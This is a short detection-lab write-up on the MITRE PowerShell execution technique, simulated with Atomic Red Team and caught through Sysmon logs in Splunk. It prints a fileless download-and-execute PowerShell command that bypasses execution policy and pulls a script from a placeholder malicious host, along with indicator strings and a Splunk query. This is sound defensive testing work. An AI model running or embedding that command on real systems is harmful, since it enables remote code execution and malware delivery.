# T1059.001 – PowerShell Execution (Atomic Red Team)

**MITRE Technique**: [T1059.001 – Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)

This attack simulates malicious PowerShell execution using Atomic Red Team on a domain-joined Windows 10 machine. The purpose is to test endpoint visibility using Sysmon and log detection with Splunk.

---

## 🌟 Description

We use an Atomic Red Team payload to simulate a fileless PowerShell attack that downloads and runs a script remotely. This simulates common adversary behavior seen in malware, ransomware loaders, and APTs.

### Atomic Command Used:

```powershell
powershell.exe -nop -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious[.]domain/script.ps1')"
```

This payload:

* Bypasses PowerShell execution policies
* Uses `IEX` (Invoke-Expression) to run code from memory
* Pulls down remote scripts using `Net.WebClient`

---

## 🔍 Detection in Splunk

### Tools Involved:

* Sysmon installed on Windows 10
* Splunk Universal Forwarder running on the same host
* Splunk Enterprise server receiving and indexing logs
* Atomic Red Team running directly on the Windows target

### Detection Method:

* **Sysmon Event ID 1** logs all process creations, including full PowerShell command lines
* Splunk ingests these logs under sourcetype `WinEventLog:Microsoft-Windows-Sysmon/Operational`

### Splunk Detection Query:

```splunk
index=endpoint sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"
| search CommandLine="*powershell*"
| table _time, Computer, User, CommandLine
```

### What to Look For:

* Use of `-nop`, `-exec bypass`
* `IEX`, `Net.WebClient`, or `DownloadString`
* Long base64 or obfuscated strings

---

## ✅ Result

* The attack was logged by Sysmon and successfully forwarded to Splunk.
* Analysts can see full command line arguments in Splunk's search.
* The query clearly shows the suspicious PowerShell activity.
